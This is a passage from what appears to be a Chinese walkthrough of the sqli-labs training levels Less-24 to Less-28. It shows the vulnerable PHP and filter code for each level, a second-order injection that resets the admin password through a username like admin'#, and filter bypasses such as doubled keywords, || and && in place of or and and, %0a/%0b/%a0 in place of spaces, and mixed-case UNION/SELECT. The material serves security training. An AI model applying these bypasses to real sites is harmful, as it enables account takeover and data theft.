$sql = &amp;quot;select count(*) from users where username=&#39;$username&#39;&amp;quot;;
if 查询结果不为0：
	表明有用户存在，不可注册；
else:
	if 两次输入密码一致：
		$sql = &amp;quot;insert into users ( username, password) values(\&amp;quot;$username\&amp;quot;, \&amp;quot;$pass\&amp;quot;)&amp;quot;;
		重定向到登录页面；
	else:
		提示输入不一致；
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;login.php&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; $username = mysql_real_escape_string($_POST[&amp;quot;login_user&amp;quot;]);
 $password = mysql_real_escape_string($_POST[&amp;quot;login_password&amp;quot;]);
 $sql = &amp;quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&amp;quot;;
 if 查询有结果：
 	$_SESSION[&amp;quot;username&amp;quot;] = 结果中的username值; //在session中设置username参数
 	重定向到已登录界面；
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;pass_change.php&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if 未登录：
	重定向到首页；

$username= $_SESSION[&amp;quot;username&amp;quot;]; //从session中取出useranme值
$curr_pass= mysql_real_escape_string($_POST[&#39;current_password&#39;]);
$pass= mysql_real_escape_string($_POST[&#39;password&#39;]);
$re_pass= mysql_real_escape_string($_POST[&#39;re_password&#39;]);

if 两次密码输入一致：
	$sql = &amp;quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &amp;quot;;
	if 执行成功：
		输出成功更新密码；
	else:
		重定向到错误页面；
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;分析&#34;&gt;分析&lt;/h3&gt;
&lt;p&gt;可看到基本上可进行直接注入的常规点都被转义过滤了，但是登录成功后，会从数据库中查询useranme值放入session；随后在pass_change页面更新密码语句存在注入点，且数据来源于从session取出来的值，也就是未过滤的值，因此存在二次注入&lt;/p&gt;
&lt;h3 id=&#34;利用&#34;&gt;利用&lt;/h3&gt;
&lt;p&gt;注册用户名为 admin’#&lt;/p&gt;
&lt;p&gt;登录之后随意填入当前密码，再填入修改后的密码，提交即可任意修改admin用户密码&lt;/p&gt;
&lt;h2 id=&#34;less-25&#34;&gt;Less-25&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/or/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;    
&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/AND/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE id=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; LIMIT 0,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;绕过&#34;&gt;绕过&lt;/h3&gt;
&lt;p&gt;双写&lt;/p&gt;
&lt;p&gt;or -&amp;gt; ||&lt;/p&gt;
&lt;p&gt;and -&amp;gt; &amp;amp;&amp;amp;(get型中要url编码，否则歧义)&lt;/p&gt;
&lt;h2 id=&#34;less-25a&#34;&gt;Less-25a&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;直接拼&lt;/td&gt;
&lt;td&gt;UNION、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;与Less-25一致，拼接方式不同，不能报错&lt;/p&gt;
&lt;h2 id=&#34;less-26&#34;&gt;Less-26&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/or/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;			&lt;span class=&#34;c1&#34;&gt;//strip out OR (non case sensitive)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/and/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;//Strip out AND (non case sensitive)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[\/\*]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;//strip out /*
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[--]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;//Strip out --
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[#]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;			&lt;span class=&#34;c1&#34;&gt;//Strip out #
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[\s]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;//Strip out spaces
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[\/\\\\]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;//Strip out slashes
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;绕过-1&#34;&gt;绕过&lt;/h3&gt;
&lt;p&gt;针对空白符，可用如下方式替换绕过，本次使用/\s/匹配，所以用%0b和%a0才可绕过&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;符号&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;%09&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;TAB 键(水平)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;%0a&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;新建一行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;%0c&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;新的一页&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;%0d&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;return 功能&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;%0b&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;TAB 键(垂直)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;%a0&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;空格&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;less-26a&#34;&gt;Less-26a&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号+单括号&lt;/td&gt;
&lt;td&gt;UNION、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;与Less-26一致，拼接方式不同，不能报错&lt;/p&gt;
&lt;h2 id=&#34;less-27&#34;&gt;Less-27&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[\/\*]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;//strip out /*
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[--]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;//Strip out --.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[#]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;			&lt;span class=&#34;c1&#34;&gt;//Strip out #.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[ +]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out spaces.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/select/m&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out spaces.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[ +]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out spaces.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/union/s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out union
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/select/s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out select
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/UNION/s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out UNION
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/SELECT/s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out SELECT
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/Union/s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out Union
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/Select/s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out select
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;绕过-2&#34;&gt;绕过&lt;/h3&gt;
&lt;p&gt;本次只是简单过滤了空格，而不是空白符，所以%0a即可绕过空格限制&lt;/p&gt;
&lt;p&gt;unioN&lt;/p&gt;
&lt;p&gt;unIon&lt;/p&gt;
&lt;p&gt;seLEct&lt;/p&gt;
&lt;p&gt;等等&lt;/p&gt;
&lt;h2 id=&#34;less-27a&#34;&gt;Less-27a&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;双引号&lt;/td&gt;
&lt;td&gt;UNION、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;与Less-27一致，没有显错&lt;/p&gt;
&lt;h2 id=&#34;less-28&#34;&gt;Less-28&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[\/\*]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;				&lt;span class=&#34;c1&#34;&gt;//strip out /*
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[--]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;				&lt;span class=&#34;c1&#34;&gt;//Strip out --.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[#]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;					&lt;span class=&#34;c1&#34;&gt;//Strip out #.
